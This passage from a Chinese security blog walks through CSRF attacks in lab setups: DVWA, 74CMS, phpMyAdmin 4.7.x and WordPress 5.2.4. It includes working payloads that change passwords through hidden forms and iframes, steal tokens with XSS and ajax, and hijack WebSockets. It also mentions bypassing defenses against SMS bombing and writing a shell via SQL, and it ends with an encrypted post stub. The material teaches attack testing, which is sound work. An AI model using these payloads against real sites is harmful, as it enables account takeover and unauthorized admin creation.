<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ws_attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://192.168.1.101:9999"</span>);</span><br><span class="line">    ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        ws.send(<span class="string">"asdfafasd"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        alert(evt);</span><br><span class="line">        ws.close();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">ws_attack();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479086.26.png" alt></p>
<p>触发</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479187.67.png" alt></p>
<p>防御：校验Origin头 ，websocket默认不校验</p>
<h2 id="CSRF实战——DVWA"><a href="#CSRF实战——DVWA" class="headerlink" title="CSRF实战——DVWA"></a>CSRF实战——DVWA</h2><blockquote>
<p>DVWA这里关于CSRF的漏洞点是重置密码</p>
</blockquote>
<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386809.77.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386943.9.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527389971.67.png" alt></h3><p>可以看到DVWA关于CSRF漏洞的出发点是GET请求，并且分析源码发现后台并没有任何过滤，直接出发CSRF漏洞</p>
<h4 id="方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）"><a href="#方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）" class="headerlink" title="方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）"></a>方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;password_conf=attack&amp;Change=Change#</span><br></pre></td></tr></table></figure>
<h4 id="方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过"><a href="#方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过" class="headerlink" title="方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)"></a>方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;password_conf=attack&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568860685.1.png" alt></p>
<p>当诱导用户点击过后CSRF已经触发，密码已经被修改</p>
<h4 id="方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）"><a href="#方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）" class="headerlink" title="方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）"></a>方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861050.58.png" alt></h4><p>两种方式，在burp代理的情况下直接在浏览器中可以测试，或者可以将生成的POC(自己可以修改)复制下来，通过链接的形式来访问<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861215.33.png" alt></p>
<p>可以发现密码已经修改</p>
<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861395.6.png" alt></p>
<p>用之前的POC进行触发发现漏洞无法触发，根据提示查看源码，发现源码对于referer头进行了限制，显示了server_name，这里就是本地的地址</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861469.09.png" alt></p>
<p>所以这里的思路就是必须要在点击构造好的链接，数据包中的referer要包含192.168.1.106，所以，将之前的POC复制下来，然后新建一个HTML，命名为192.168.1.106.html,让模拟攻击者放在可控服务器上，让用户访问(注意，burpsuit的POC注释掉history.pushState函数，否则无法在referer头中添加server_name)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="comment">/*history.pushState('', '', '/')*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.1.106/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"admin888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"admin888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862110.62.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862136.12.png" alt></p>
<p>可以看到：referer头限制成功绕过，漏洞触发。</p>
<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><h4 id="方法一：结合存储型xss"><a href="#方法一：结合存储型xss" class="headerlink" title="方法一：结合存储型xss"></a>方法一：结合存储型xss</h4><p>点击修改密码后抓取数据包如下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862268.49.png" alt></p>
<p>可以发现在请求中多了user_token,这样就可以使得csrf失效了，查看源码确认判断<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862497.23.png" alt></p>
<p>怎么绕过呢，思路：在请求前获取到服务端下发的token，然后带入请求劫持用户操作，触发CSRF，将POC构造为一下可以获取user_token。攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value = <span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">    &lt;iframe src="http:/</span><span class="regexp">/192.168.1.106/</span>vulnerabilities/csrf<span class="string">" id="</span>hack<span class="string">" border="</span><span class="number">0</span><span class="string">" style="</span>display:none;<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &lt;body onload="</span>attack()<span class="string">"&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &lt;form method="</span>GET<span class="string">" id="</span>transfer<span class="string">" action="</span>http:<span class="comment">//192.168.1.106/vulnerabilities/csrf"&gt;</span></span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"attack"</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"attack"</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_token"</span> value=<span class="string">""</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span>&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试一下：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869029.13.png" alt></p>
<p>为什么会出现这种情况：因为现在的浏览器、基本都不会允许跨域的操作，我们的框架iframe访问的地址是<a href="http://192.168.1.106/vulnerabilities/csrf" target="_blank" rel="noopener">http://192.168.1.106/vulnerabilities/csrf</a>，位于服务器192.168.1.106上，而我们的攻击页面位于黑客服务器192.168.1.101上，两者的域名不同，域名B下的所有页面都不被允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。</p>
<p>理想和现实的差距是比较大的，这次直接在目标站点上放上POC测试(不跨域的情况下，当然，既然能上传了，还挖什么CSRF呀，手动滑稽)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869404.4.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869465.77.png" alt></p>
<p>可以看到，在理想情况下，成功获取到user_token,触发CSRF漏洞，将用户密码改为admin888</p>
<p><strong>理想情况测试完后，想想怎么绕过：组合漏洞，通过XSS获取用户的user_token，然后结合CSRF触发</strong></p>
<p>首先在存储型XSS的name处注入代码，触发存储型XSS漏洞，弹出user_token</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"../csrf"</span> onload=alert(frames[<span class="number">0</span>].document.getElementsByName(<span class="string">"user_token"</span>)[<span class="number">0</span>].value)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872357.86.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872377.73.png" alt></p>
<p>可以看到代码已经注入进去了，利用存储型XSS获取user_token,然后在CSRF处修改密码抓包生成POC替换user_token值既可触发CSRF漏洞<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872555.58.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872610.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872638.08.png" alt></p>
<p>可以看到漏洞触发，密码被修改。</p>
<h4 id="方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）"><a href="#方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）" class="headerlink" title="方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）"></a>方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）</h4><p>CSRF结合同Security Level的 XSS漏洞，通过ajax实现跨域请求来获取用户的user_token</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://192.168.1.106/vulnerabilities/csrf/'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="built_in">console</span>.log(match);</span><br><span class="line">        alert(match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> new_url = <span class="string">'http://192.168.1.106/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new=test&amp;password_conf=test&amp;Change=Change'</span>;</span><br><span class="line">                <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">                    xmlhttp.send();</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h3><blockquote>
<p>在前面dvwa的high等级中，对于csrf的防御点就在于user_token，通过token可以进行身份鉴别，当然，在没有登录的情况下只能通过组合漏洞获取token或者看看有没有token泄露；除此之外，token在登录的情况下(即以及获取到token的情况下)除了身份鉴别之外，还可以防止重放，因为数据包的重放每次都要更新token，所以在以token为重放判定的情况下，怎么不断重新获取token呢，当然不能手动获取，burp上有插件实现了cookie的更新(有些情况是把token加在cookie中的)，但是对于没有在cookie中的token，可以通过CSRF Token Tracker插件实现自动更新，表面意思是只能更新csrf——token，其实都可以。这样在某些场景，比如短信轰炸啥的就可以突破了，还有些服务端有下发sign的情况，这种插件目前没有发现。</p>
</blockquote>
<p>以dvwa中CSRF的high等级为例</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875700.86.png" alt></p>
<p>没有更新token时修改密码重放<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875765.59.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876011.68.png" alt></p>
<p>实时更新token测试<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875932.29.png" alt></p>
<h2 id="CSRF实战——74CMS"><a href="#CSRF实战——74CMS" class="headerlink" title="CSRF实战——74CMS"></a>CSRF实战——74CMS</h2><h3 id="登录74CMS的后台进行添加管理员操作并抓包"><a href="#登录74CMS的后台进行添加管理员操作并抓包" class="headerlink" title="登录74CMS的后台进行添加管理员操作并抓包"></a>登录74CMS的后台进行添加管理员操作并抓包</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876799.13.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876817.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876946.98.png" alt></p>
<p>无token且服务端没有验证referer，直接生成POC测试</p>
<h3 id="生成POC，添加管理账户"><a href="#生成POC，添加管理账户" class="headerlink" title="生成POC，添加管理账户"></a>生成POC，添加管理账户</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877019.83.png" alt></p>
<p>返回后台查看，发现用户已经添加成功<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877075.24.png" alt></p>
<h3 id="使用添加的账号登录"><a href="#使用添加的账号登录" class="headerlink" title="使用添加的账号登录"></a>使用添加的账号登录</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877183.91.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877231.37.png" alt></p>
<h2 id="CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF"><a href="#CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF" class="headerlink" title="CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF"></a>CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF</h2><blockquote>
<p>环境半天打不开哦，直接截图了</p>
</blockquote>
<h3 id="登录靶机"><a href="#登录靶机" class="headerlink" title="登录靶机"></a>登录靶机<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877618.55.png" alt></h3><h3 id="利用SQL语句更新密码，构造POC"><a href="#利用SQL语句更新密码，构造POC" class="headerlink" title="利用SQL语句更新密码，构造POC"></a>利用SQL语句更新密码，构造POC</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> passsword=<span class="keyword">PASSWORD</span>(<span class="string">'demos'</span>);</span><br><span class="line"> </span><br><span class="line">http://f1496b741e86dce4b2f79f3e839f977d.vsplate.me:19830/pma/sql.php?db=mysql&amp;table=user&amp;sql_query=<span class="keyword">SET</span>%<span class="number">20</span><span class="keyword">password</span></span><br><span class="line">%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">PASSWORD</span>(%<span class="number">27</span>demos%<span class="number">27</span>)</span><br></pre></td></tr></table></figure>
<p>然后即可利用短域名伪装发送，在这种特定场景下，还可以利用SQL语句进行写shell。</p>
<h2 id="CSRF实战——wordpress5-2-4"><a href="#CSRF实战——wordpress5-2-4" class="headerlink" title="CSRF实战——wordpress5.2.4"></a>CSRF实战——wordpress5.2.4</h2><blockquote>
<p>在后台添加账户处存在csrf，可以利用此处漏洞诱导管理员点击添加管理员账户</p>
</blockquote>
<p>没有referer和token、origin验证</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716416.22.png" alt></p>
<p>直接通过burp抓包生产CSRF-POC在浏览器测试</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716515.04.png" alt></p>
<p>结果如下</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716543.41.png" alt></p>
<h2 id="组合拳"><a href="#组合拳" class="headerlink" title="组合拳"></a>组合拳</h2><blockquote>
<p>记录一些学习到的思路</p>
</blockquote>
<ul>
<li><p>CSRF结合XSS形成上下文漏洞，绕过限制</p>
</li>
<li><p>CSRF结合URL跳转绕过限制</p>
</li>
<li><p><a href="https://gh0st.cn/archives/2018-04-28/1" target="_blank" rel="noopener">CSRF结合点击劫持拿下权限</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个思路比较有意思，首先有些平台会存在绑定第三方账号的功能，在已经登录的情况下，点击劫持伪造登录，诱导攻击者点击从而登录第三方账号(攻击者自己的账号),登录后iframe直接跳转到绑定的界面，然后劫持用户继续点击绑定，从而使得受害者在平台上绑定的第三方账号是攻击者注册的小号，从而利用这种思路劫持到受害者平台的权限。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF的漏洞挖掘方式，在用户可以增删改(大多数情况)查(jsonp跨、flash跨域、cors跨域)，查看数据包中是否又token、目标表单是否又验证码、目标数据包是否验证了referer来源，json数据是否可以自定义callback函数、flash网站根目录下的crossdomain.xml 中的”access-from domain”是否为通配符、cors、websocket是否验证origin来源。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/118352.html</a></p>
<p><a href="https://xz.aliyun.com/t/6128#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/6128#toc-16</a></p>
<p><a href="https://www.vulnspy.com/?u=pmasa-2017-9" target="_blank" rel="noopener">https://vulnspy.com/?u=pmasa-2017-9</a></p>
<p><a href="https://xz.aliyun.com/t/5871#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5871#toc-3</a></p>
<p><a href="https://c1h2e1.github.io/#" target="_blank" rel="noopener">https://c1h2e1.github.io/#</a></p>
<p><a href="https://gh0st.cn/archives/2018-03-22/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-03-22/1</a></p>
<p><a href="https://gh0st.cn/archives/2019-03-20/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2019-03-20/1</a></p>
<p><a href="https://www.cnblogs.com/chyingp/p/websocket-deep-in.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/p/websocket-deep-in.html</a></p>
<p><a href="https://xz.aliyun.com/t/5143" target="_blank" rel="noopener">JSONP绕过CSRF防护token </a></p>
<p><a href="https://gh0st.cn/archives/2018-08-01/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-08-01/1</a></p>
<p><a href="https://gh0st.cn/archives/2018-04-28/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-04-28/1</a> </p>
]]></content>
      <categories>
        <category>web前端相关</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-14287 linux sudo版本小于1.8.28本地root权限提升</title>
    <url>/2019/10/16/CVE-2019-14287-linux-sudo%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8E1-8-28%E6%9C%AC%E5%9C%B0root%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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